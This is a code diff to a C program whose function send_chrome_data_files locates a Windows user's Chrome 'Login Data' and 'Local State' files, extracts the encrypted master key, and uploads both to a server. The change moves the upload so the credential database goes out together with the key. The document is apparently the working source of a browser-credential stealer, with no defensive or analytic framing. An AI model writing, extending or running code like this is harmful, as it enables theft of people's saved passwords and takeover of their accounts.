@@ -3,12 +3,12 @@
 #include <string.h>
 #include "../include/http.h"
 #include "../include/structures.h"
+#include "../include/uid.h"
 
 int send_chrome_data_files(COMPUTER_INFOS *cmp_info)
 {
     char chrome_data_login_path[512];
     snprintf(chrome_data_login_path, sizeof(chrome_data_login_path), "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", cmp_info->username);
-    upload_to_server(chrome_data_login_path);
 
     char chrome_encrypted_data_path[512];
     snprintf(chrome_encrypted_data_path, sizeof(chrome_encrypted_data_path), "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", cmp_info->username);
@@ -50,6 +50,9 @@ int send_chrome_data_files(COMPUTER_INFOS *cmp_info)
             {
                 strncpy(encrypted_key, start, key_length);
                 encrypted_key[key_length] = '\0';
+
+                upload_to_server(chrome_data_login_path, "chromedata", encrypted_key);
+
                 printf("Encrypted Key: %s\n", encrypted_key);
                 free(encrypted_key);
             }
